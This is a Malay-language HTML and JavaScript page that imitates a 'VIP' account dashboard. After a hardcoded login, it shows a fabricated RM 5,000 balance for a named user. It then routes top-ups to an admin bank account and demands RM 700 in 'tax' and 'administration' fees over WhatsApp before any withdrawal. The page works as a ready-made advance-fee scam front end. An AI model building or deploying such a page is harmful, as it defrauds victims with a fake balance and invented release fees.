<!DOCTYPE html>
<html lang="ms">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Akaun Premium</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}

body{
    background:linear-gradient(180deg,#020617,#0f172a);
    color:white;
}

/* HEADER */
.header{
    padding:20px;
    display:flex;
    justify-content:space-between;
    align-items:center;
}
.logo{font-weight:bold;color:#facc15;}
.profile{width:35px;height:35px;border-radius:50%;background:#1e293b;}

/* CARD SALDO */
.balance-card{
    margin:15px;
    padding:20px;
    border-radius:20px;
    background:linear-gradient(135deg,#1e3a8a,#9333ea);
}
.balance{font-size:28px;margin-top:10px;font-weight:bold;}
.user{font-size:13px;opacity:0.8;margin-top:5px;}

/* INPUT */
.input{padding:15px;}
.input input{
    width:100%;
    padding:15px;
    border:none;
    border-radius:15px;
    background:#1e293b;
    color:white;
}

/* MENU */
.menu{
    display:flex;
    gap:10px;
    padding:15px;
}
.menu button{
    flex:1;
    padding:15px;
    border:none;
    border-radius:15px;
    color:white;
    font-weight:bold;
}
.topup{background:#22c55e;}
.withdraw{background:#ef4444;}

/* CARD */
.card{
    margin:15px;
    padding:20px;
    border-radius:20px;
    background:#0f172a;
    border:1px solid rgba(255,255,255,0.1);
}

.row{
    display:flex;
    justify-content:space-between;
    margin:8px 0;
}

/* WA BUTTON */
.wa button{
    width:100%;
    padding:14px;
    border:none;
    border-radius:12px;
    background:#25D366;
    font-weight:bold;
    margin-top:10px;
}

/* LOGIN */
#login{padding:20px;}
.login-box{
    margin-top:120px;
    background:#0f172a;
    padding:20px;
    border-radius:20px;
}
.login-box input{
    width:100%;
    padding:15px;
    margin:10px 0;
    border:none;
    border-radius:10px;
    background:#1e293b;
    color:white;
}
.login-box button{
    width:100%;
    padding:15px;
    border:none;
    border-radius:10px;
    background:#22c55e;
    font-weight:bold;
}

#dashboard{display:none;}
</style>

</head>
<body>

<!-- LOGIN -->
<div id="login">
    <div class="login-box">
        <h2>Log Masuk</h2>
        <input type="text" id="id" placeholder="ID">
        <input type="password" id="pass" placeholder="Kata Laluan">
        <button onclick="login()">Masuk</button>
    </div>
</div>

<!-- DASHBOARD -->
<div id="dashboard">

<div class="header">
    <div class="logo">AKAUN VIP</div>
    <div class="profile"></div>
</div>

<div class="balance-card">
    <div>Baki Semasa</div>
    <div class="balance" id="saldo">RM 0</div>
    <div class="user" id="user"></div>
</div>

<div class="input">
    <input type="number" id="jumlah" placeholder="Masukkan jumlah">
</div>

<div class="menu">
    <button class="topup" onclick="showAdmin()">Tambah Baki</button>
    <button class="withdraw" onclick="showWithdraw()">Pengeluaran</button>
</div>

<!-- ADMIN TOP UP -->
<div class="card" id="adminBox" style="display:none;">
    <h3>Pindahan ke Admin</h3>

    <div class="row"><span>Bank</span><span>BRI</span></div>
    <div class="row"><span>No Akaun</span><span>1234567890</span></div>
    <div class="row"><span>Nama</span><span>ADMIN STORE</span></div>
    <div class="row"><span>Jumlah</span><span id="nominal">RM 0</span></div>

    <div class="wa">
        <a id="waTopup" target="_blank">
            <button>Chat WhatsApp (Top Up)</button>
        </a>
    </div>
</div>

<!-- WITHDRAW PAGE -->
<div class="card" id="withdrawBox" style="display:none;">
    <h3>Permohonan Pengeluaran</h3>

    <p style="font-size:13px;opacity:0.7;margin-top:10px;">
        Proses pengeluaran memerlukan pengesahan sistem terlebih dahulu:
    </p>

    <div class="row"><span>Cukai (Tax)</span><span>RM 300</span></div>
    <div class="row"><span>Administrasi</span><span>RM 200</span></div>
    <div class="row"><span>Penarikan Awal</span><span>RM 200</span></div>

    <div class="row" style="font-weight:bold;color:#22c55e;">
        <span>Jumlah</span><span>RM 700</span>
    </div>

    <div class="wa">
        <a id="waWithdraw" target="_blank">
            <button>Chat WhatsApp (Pengeluaran)</button>
        </a>
    </div>
</div>

</div>

<script>

let currentUser=null;
const noAdmin="6285183034790";

const users=[
    {id:"123",password:"123",nama:"Farid Fauzan",saldo:5000}
];

function login(){
    let id=document.getElementById("id").value;
    let pass=document.getElementById("pass").value;

    let user=users.find(u=>u.id===id && u.password===pass);

    if(user){
        currentUser=user;
        document.getElementById("login").style.display="none";
        document.getElementById("dashboard").style.display="block";

        document.getElementById("user").innerText=user.nama+" ("+user.id+")";
        updateSaldo();
    }else{
        alert("Login gagal");
    }
}

function formatRM(x){
    return x.toLocaleString("ms-MY");
}

function updateSaldo(){
    document.getElementById("saldo").innerText="RM "+formatRM(currentUser.saldo);
}

/* TOP UP */
function showAdmin(){
    let jumlah=parseInt(document.getElementById("jumlah").value);

    if(!jumlah){
        alert("Masukkan jumlah!");
        return;
    }

    document.getElementById("adminBox").style.display="block";
    document.getElementById("withdrawBox").style.display="none";

    document.getElementById("nominal").innerText="RM "+formatRM(jumlah);

    let msg=`Halo admin,
Saya ingin top up RM ${formatRM(jumlah)}.

ID: ${currentUser.id}
Nama: ${currentUser.nama}`;

    document.getElementById("waTopup").href=
        `https://wa.me/${noAdmin}?text=${encodeURIComponent(msg)}`;
}

/* WITHDRAW */
function showWithdraw(){
    document.getElementById("withdrawBox").style.display="block";
    document.getElementById("adminBox").style.display="none";

    let msg=`Halo admin,
Saya ingin melakukan pengeluaran.

ID: ${currentUser.id}
Nama: ${currentUser.nama}

Mohon panduan proses pengeluaran.`;

    document.getElementById("waWithdraw").href=
        `https://wa.me/${noAdmin}?text=${encodeURIComponent(msg)}`;
}

</script>

</body>
</html>
